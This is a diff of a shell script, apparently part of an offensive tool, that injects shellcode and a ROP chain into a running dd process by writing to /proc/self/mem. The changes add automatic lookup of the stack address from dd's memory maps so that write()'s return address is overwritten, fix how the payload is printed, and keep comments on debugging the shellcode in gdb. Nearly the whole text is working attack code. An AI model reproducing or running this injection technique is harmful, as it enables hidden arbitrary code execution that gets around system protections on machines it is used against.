@@ -1,11 +1,6 @@
 #!/bin/sh
 
-# A _very_ long filename may shift the stack too much and oblige to lower
-# the `write_to_addr' variable.
 filename=/bin/dd
-# Position in the stack we start to overwrite. We are trying to overflow
-# write()'s stack and take control from there.
-write_to_addr=$((0x7fffffffe000))
 
 # Prepend the shellcode with an infinite loop (so I can attach to it with gdb)
 # Then in gdb just use `set *(short*)$pc=0x9090' and you will be able to `si'
@@ -27,7 +22,7 @@ endian()
 }
 
 # search_section "file" $filename $section
-# search_section "bin" $filename $section (and the binary through stdin)
+# search_section "bin" "" $section (and the binary through stdin)
 search_section()
 {
     local data=""
@@ -315,8 +310,17 @@ sc_addr=$(endian $(printf %016x $sc_addr))
 rop=$(craft_rop $sc_len)
 rop_len=$((${#rop} / 2))
 
-payload=$(echo -n $rop$sc | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
+
+# Position in the stack we start to overwrite. We are trying to overflow
+# write()'s stack and take control from there. I've found experimentally that
+# the RIP(s) for write() is always in the last page of the stack, and that it is
+# consistent across versions and compilations of dd... in ARM too!
+write_to_addr=$(echo "$dd_maps" | grep -F "[stack]" | cut -d' ' -f1 |\
+                cut -d'-' -f2)
+write_to_addr=$(((0x$write_to_addr - 1) & (~0xfff)))
+
+payload=$(printf %s "$rop$sc" | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
 # Have fun!
-printf $payload |\
+printf '%b' "$payload" |\
 (sleep .1; $noaslr env -i $filename bs=$rop_len count=1 of=/proc/self/mem \
 seek=$write_to_addr conv=notrunc oflag=seek_bytes iflag=fullblock) 2>&1
